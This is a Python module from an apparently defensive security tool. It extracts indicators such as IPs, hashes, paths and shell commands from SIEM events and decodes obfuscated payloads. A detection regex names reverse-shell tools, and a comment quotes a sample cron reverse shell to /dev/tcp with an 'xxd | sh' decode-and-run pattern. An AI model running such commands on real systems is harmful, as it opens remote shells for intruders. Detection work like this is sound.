"""Deterministic artifact extraction from retrieved event payloads."""
from __future__ import annotations

import base64
import binascii
import ipaddress
import json
import re
from dataclasses import dataclass
from urllib.parse import unquote


@dataclass(frozen=True)
class Artifact:
    kind: str
    value: str
    source: str = ""


_KEY_TYPES = {
    "srcip": "ip",
    "dstip": "ip",
    "src_ip": "ip",
    "dst_ip": "ip",
    "source.ip": "ip",
    "destination.ip": "ip",
    "client.ip": "ip",
    "server.ip": "ip",
    "ip": "ip",
    "sha256": "sha256",
    "file.hash.sha256": "sha256",
    "sha1": "sha1",
    "file.hash.sha1": "sha1",
    "md5": "md5",
    "file.hash.md5": "md5",
    "domain": "domain",
    "dns.question.name": "domain",
    "url.domain": "domain",
    "hostname": "host",
    "host.name": "host",
    "agent.name": "host",
    "computer_name": "host",
    "username": "user",
    "user.name": "user",
    "srcuser": "user",
    "dstuser": "user",
    "process.name": "process",
    "process.executable": "file",
    "file.path": "file",
    "target.file.path": "file",
}
# Keys whose VALUE is a shell/audit command line. The command itself is recorded
# as a `command` artifact, and file paths / IPs embedded in it are mined out as
# `file` / `ip` artifacts (these often never appear as structured fields).
_COMMAND_KEYS = (
    "command",
    "data.command",
    "audit.command",
    "data.audit.command",
    "data.audit.execve",
    "process.args",
    "process.command_line",
)
_EVENT_ID_KEYS = ("_id", "event.id", "event_id")
# Absolute file paths embedded in command strings (e.g. /var/spool/cron/crontabs/user).
_PATH_RE = re.compile(r"/(?:[\w.+-]+/)+[\w.+-]+")
# Bare IPv4/IPv6 literals embedded in command strings.
_IP_IN_TEXT_RE = re.compile(r"\b\d{1,3}(?:\.\d{1,3}){3}\b|\b(?:[0-9a-fA-F]{1,4}:){2,7}[0-9a-fA-F]{1,4}\b")
# Cap how many embedded paths/IPs we mine from a single command to avoid flooding.
_MAX_EMBEDDED_PER_COMMAND = 8
_MAX_COMMAND_LEN = 512
_HASH_LENGTHS = {"md5": 32, "sha1": 40, "sha256": 64}
# Trailing audit id suffix on usernames: `root(uid=0)`, `user (auid=1000)`, etc.
_UID_SUFFIX_RE = re.compile(r"\s*\((?:[a-z]*uid)=\d+\)\s*$", re.IGNORECASE)
_DOMAIN_RE = re.compile(
    r"^(?=.{1,253}$)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}$",
    re.IGNORECASE,
)
_SHELL_INDICATOR_RE = re.compile(
    r"(reverse shell|/dev/tcp/|sh\s+-i|bash\s+-i|nc\s+-e|netcat)",
    re.IGNORECASE,
)
# Syscheck/FIM `diff` blobs carry the changed line wrapped in diff syntax, e.g.
#   0a1
#   > * * * * * sh -i >& /dev/tcp/10.0.2.5/5555 0>&1
# Recording the whole blob verbatim pollutes the board with `command: 0a1` style
# noise, so we strip diff hunk headers and per-line +/-/</> markers and keep only
# the substantive lines.
_DIFF_HUNK_RE = re.compile(r"^(?:@@.*@@|\d+[acd]\d+|---\s|\+\+\+\s|[<>+-]\s*$)")
_DIFF_PREFIX_RE = re.compile(r"^[+\-<>]\s?")
# Long even-length hex tokens that may be encoded payloads (min 16 hex chars = 8 bytes;
# skip known hash lengths 32/40/64 which are handled separately).
_HEX_PAYLOAD_RE = re.compile(r"\b([0-9a-fA-F]{16,512})\b")
_HASH_LENGTHS_SET = frozenset(_HASH_LENGTHS.values())
# Base64 / urlsafe-base64 tokens that may be encoded payloads. Min 16 chars keeps the
# false-positive rate down; the command classifier (not the decode) is the real gate.
_B64_PAYLOAD_RE = re.compile(r"\b([A-Za-z0-9+/_-]{16,1024}={0,2})")
# Cap decode work per value so a pathological field cannot blow up extraction.
_MAX_DECODE_TOKENS = 6
_MIN_PRINTABLE_RATIO = 0.85


def _printable_ratio_ok(decoded: str, threshold: float = _MIN_PRINTABLE_RATIO) -> bool:
    if not decoded:
        return False
    printable = sum(1 for c in decoded if c.isprintable() or c in "\t\n\r")
    return printable / len(decoded) >= threshold


def _try_decode_hex(token: str) -> str | None:
    """Decode an even-length hex token to UTF-8 text if mostly printable; else None."""
    if len(token) % 2 != 0 or len(token) in _HASH_LENGTHS_SET:
        return None
    try:
        decoded = bytes.fromhex(token).decode("utf-8", errors="replace")
    except ValueError:
        return None
    return decoded if _printable_ratio_ok(decoded, 0.80) else None


def _try_decode_base64(token: str) -> str | None:
    """Decode a base64 / urlsafe-base64 token to UTF-8 text if mostly printable.

    Handles missing padding and both standard and urlsafe alphabets. Rejects tokens
    that don't decode to substantial, mostly-printable text (e.g. random ids).
    """
    if len(token) < 16:
        return None
    candidate = token.replace("-", "+").replace("_", "/")
    candidate += "=" * (-len(candidate) % 4)
    try:
        raw = base64.b64decode(candidate, validate=True)
    except (binascii.Error, ValueError):
        return None
    if len(raw) < 4:
        return None
    decoded = raw.decode("utf-8", errors="replace")
    return decoded if _printable_ratio_ok(decoded) else None


def _decode_surfaces(text: str) -> list[str]:
    """Return decoded forms hidden inside a string (hex, base64, URL-encoding).

    Many payloads ride inside a URL query parameter (e.g. a webshell's
    `?wp_meta=<base64-json-argv>`) or are hex/base64 obfuscated. This peels those
    encodings so the caller can re-scan the plaintext for command/shell signatures.
    The value itself is NOT included — only genuinely decoded forms.
    """
    surfaces: list[str] = []
    seen: set[str] = set()
    candidates = [text]
    unquoted = unquote(text)
    if unquoted != text:
        candidates.append(unquoted)

    def _add(dec: str | None) -> None:
        if dec and dec not in seen:
            seen.add(dec)
            surfaces.append(dec)

    for cand in candidates:
        for tok in _HEX_PAYLOAD_RE.findall(cand)[:_MAX_DECODE_TOKENS]:
            _add(_try_decode_hex(tok))
        for tok in _B64_PAYLOAD_RE.findall(cand)[:_MAX_DECODE_TOKENS]:
            _add(_try_decode_base64(tok))
    return surfaces


def _looks_like_command(text: str) -> bool:
    """True when a (possibly decoded) string is a shell/command payload.

    Two signals: an explicit shell/reverse-shell indicator, or a JSON argv array
    (`["bin","arg",...]`) — the shape webshells use to pass a command vector. The
    argv check catches credential-dump and password-cracking payloads that carry no
    reverse-shell keyword.
    """
    if not text:
        return False
    if _SHELL_INDICATOR_RE.search(text):
        return True
    stripped = text.strip()
    if stripped.startswith("[") and stripped.endswith("]"):
        try:
            arr = json.loads(stripped)
        except (TypeError, ValueError):
            return False
        return bool(arr) and isinstance(arr, list) and all(isinstance(x, str) for x in arr)
    return False


def _argv_to_cmdline(text: str) -> str:
    """Render a JSON argv array as a readable command line; pass other text through."""
    stripped = text.strip()
    if stripped.startswith("[") and stripped.endswith("]"):
        try:
            arr = json.loads(stripped)
        except (TypeError, ValueError):
            return text
        if isinstance(arr, list) and all(isinstance(x, str) for x in arr):
            return " ".join(part.strip() for part in arr if part.strip())
    return text


def _flatten(value, prefix: str = ""):
    if isinstance(value, dict):
        for key, child in value.items():
            path = f"{prefix}.{key}" if prefix else str(key)
            yield from _flatten(child, path)
    elif isinstance(value, list):
        for child in value:
            yield from _flatten(child, prefix)
    else:
        yield prefix.lower(), value


def _source_id(event: dict) -> str:
    flattened = dict(_flatten(event))
    for key in _EVENT_ID_KEYS:
        value = flattened.get(key)
        if value not in (None, ""):
            return str(value)
        for path, nested_value in flattened.items():
            if path.endswith(f".{key}") and nested_value not in (None, ""):
                return str(nested_value)
    return ""


def _normalize(kind: str, value) -> str | None:
    if not isinstance(value, (str, int)):
        return None
    text = str(value).strip()
    if not text or len(text) > 2048:
        return None
    if kind == "ip":
        try:
            return str(ipaddress.ip_address(text))
        except ValueError:
            return None
    if kind in _HASH_LENGTHS:
        compact = text.lower()
        if len(compact) != _HASH_LENGTHS[kind] or not all(c in "0123456789abcdef" for c in compact):
            return None
        return compact
    if kind == "domain":
        candidate = text.rstrip(".").lower()
        return candidate if _DOMAIN_RE.fullmatch(candidate) else None
    if kind == "user":
        # Audit events render users as `name(uid=0)` / `root(euid=0)`. Strip the
        # parenthetical id suffix so the audit form collapses onto the plain account
        # name — otherwise `root` and `root(uid=0)` are treated as distinct entities
        # (duplicate board rows, duplicate correlations, ambiguous identity).
        text = _UID_SUFFIX_RE.sub("", text).strip()
        if not text:
            return None
    return text


def _event_dicts(payload) -> list[dict]:
    event_keys = ("events", "hits", "results", "documents", "alerts", "minority_sample")
    out: list[dict] = []
    seen: set[str] = set()

    def add(event: dict) -> None:
        source = _source_id(event)
        if source:
            key = f"id:{source}"
        else:
            try:
                key = "raw:" + json.dumps(event, sort_keys=True, default=str)
            except TypeError:
                key = f"obj:{id(event)}"
        if key in seen:
            return
        seen.add(key)
        out.append(event)

    def add_items(items) -> None:
        if isinstance(items, list):
            for item in items:
                if isinstance(item, dict):
                    add(item)

    def walk(obj) -> None:
        if isinstance(obj, list):
            add_items(obj)
            return
        if not isinstance(obj, dict):
            return

        found_container = False
        for key in event_keys:
            items = obj.get(key)
            if isinstance(items, list):
                found_container = True
                add_items(items)
            elif key == "hits" and isinstance(items, dict):
                nested_hits = items.get("hits")
                if isinstance(nested_hits, list):
                    found_container = True
                    add_items(nested_hits)

        data = obj.get("data")
        if isinstance(data, (dict, list)):
            walk(data)

        # A single native event/document is eligible when it has an event identifier.
        if not found_container and _source_id(obj):
            add(obj)

    walk(payload)
    return out


def _artifact_kind(key: str) -> str | None:
    if key in _KEY_TYPES:
        return _KEY_TYPES[key]
    matches = [
        (candidate, kind)
        for candidate, kind in _KEY_TYPES.items()
        if key.endswith(f".{candidate}")
    ]
    if not matches:
        return None
    return max(matches, key=lambda item: len(item[0]))[1]


def _is_command_key(key: str) -> bool:
    return key in _COMMAND_KEYS or any(
        key.endswith(f".{candidate}") for candidate in _COMMAND_KEYS
    )


def _extract_shell_lines(blob: str) -> str:
    """From a diff/free-form blob, return only the shell-bearing lines with diff
    markers stripped, deduped and joined. Empty string when none qualify (caller
    falls back to the raw value, preserving behavior for plain command strings)."""
    lines: list[str] = []
    for raw_line in blob.splitlines():
        line = raw_line.strip()
        if not line or _DIFF_HUNK_RE.match(line):
            continue
        line = _DIFF_PREFIX_RE.sub("", line).strip()
        if line and _SHELL_INDICATOR_RE.search(line):
            lines.append(line)
    return "; ".join(dict.fromkeys(lines))


def _mine_command(command: str, source: str) -> list[Artifact]:
    """Record a command line plus the file paths / IPs embedded in it.

    Also decodes any hex-encoded payload tokens (e.g. `echo HEX | xxd -r -p | sh`)
    and mines paths/IPs from the decoded content.
    """
    text = command.strip()
    if not text:
        return []
    out: list[Artifact] = [Artifact("command", text[:_MAX_COMMAND_LEN], source)]
    seen: set[tuple[str, str]] = set()

    # Collect all text surfaces to mine: original command + any decoded hex payloads.
    surfaces: list[str] = [text]
    for hex_token in _HEX_PAYLOAD_RE.findall(text):
        decoded = _try_decode_hex(hex_token)
        if decoded is None:
            continue
        surfaces.append(decoded)
        # Emit the decoded payload as a command artifact so analysts see it plaintext.
        label = f"[hex-decoded] {decoded[:_MAX_COMMAND_LEN]}"
        key = ("command", label.lower())
        if key not in seen:
            seen.add(key)
            out.append(Artifact("command", label, source))

    for surface in surfaces:
        for match in _PATH_RE.findall(surface)[:_MAX_EMBEDDED_PER_COMMAND]:
            key = ("file", match.lower())
            if key not in seen:
                seen.add(key)
                out.append(Artifact("file", match, source))
        for match in _IP_IN_TEXT_RE.findall(surface)[:_MAX_EMBEDDED_PER_COMMAND]:
            normalized = _normalize("ip", match)
            if normalized is None:
                continue
            key = ("ip", normalized)
            if key not in seen:
                seen.add(key)
                out.append(Artifact("ip", normalized, source))
    return out


def extract_artifacts(raw: str) -> list[Artifact]:
    """Extract allow-listed artifact fields from event-shaped JSON only."""
    try:
        payload = json.loads(raw)
    except (TypeError, ValueError, json.JSONDecodeError):
        return []

    found: dict[tuple[str, str], Artifact] = {}
    for event in _event_dicts(payload):
        # The event id is provenance only — it is the `source` for real artifacts,
        # never an artifact itself (opaque ids are not pivotable).
        source = _source_id(event)
        for key, value in _flatten(event):
            # Command lines: record the command and mine embedded file paths / IPs.
            if _is_command_key(key) and isinstance(value, str):
                for artifact in _mine_command(value, source):
                    found.setdefault((artifact.kind, artifact.value.lower()), artifact)
                continue
            # Free-form fields (full_log, syscheck diffs, data.url query params) often
            # carry the interesting command line — plaintext, in a diff blob, or
            # obfuscated (hex/base64) inside a URL parameter. Peel any encodings, then
            # mine every surface that classifies as a command/shell payload.
            if isinstance(value, str):
                command_surfaces: list[tuple[str, bool]] = []  # (surface, is_decoded)
                if _looks_like_command(value):
                    command_surfaces.append((value, False))
                for decoded in _decode_surfaces(value):
                    if _looks_like_command(decoded):
                        command_surfaces.append((decoded, True))
                for surface, is_decoded in command_surfaces:
                    # Clean diff syntax / render argv to a readable command line so the
                    # artifact is the actual command, not diff noise or a JSON blob.
                    base = _extract_shell_lines(surface) or _argv_to_cmdline(surface)
                    if is_decoded:
                        base = f"[decoded] {base}"
                    for artifact in _mine_command(base, source):
                        found.setdefault((artifact.kind, artifact.value.lower()), artifact)
            kind = _artifact_kind(key)
            if not kind:
                continue
            normalized = _normalize(kind, value)
            if normalized is None:
                continue
            found.setdefault((kind, normalized.lower()), Artifact(kind, normalized, source))
    return list(found.values())


def record_artifacts(
    raw: str,
    *,
    case_id: str,
    run_id: str,
    agent_name: str,
) -> list[Artifact]:
    """Persist NOVEL extracted artifacts and return only those (run-deduped).

    Returning only artifacts not already on the board is what keeps re-touching a
    known entity from looking like progress: the downstream consumers — the observation's
    `new_artifacts` markers (which drive `advanced_objective`), auto-correlation, and TI
    enrichment — all key off this return, so a batch that surfaces only already-seen
    IOCs yields no false "new evidence" and no redundant correlation/TI work.
    """
    artifacts = extract_artifacts(raw)
    if not artifacts:
        return []

    from aci_board import store

    store.init_db()
    seen = {
        (e.get("content") or "").strip().lower()
        for e in store.list_entries(case_id, run_id, agent_name)
        if e.get("kind") == "artifact"
    }
    novel: list[Artifact] = []
    for artifact in artifacts:
        content = f"{artifact.kind}: {artifact.value}"
        key = content.strip().lower()
        if key in seen:
            continue
        seen.add(key)
        store.add_entry(
            case_id=case_id,
            run_id=run_id,
            agent_name=agent_name,
            kind="artifact",
            content=content,
            source=artifact.source,
            confidence="high",
            status="observed",
        )
        novel.append(artifact)
    return novel
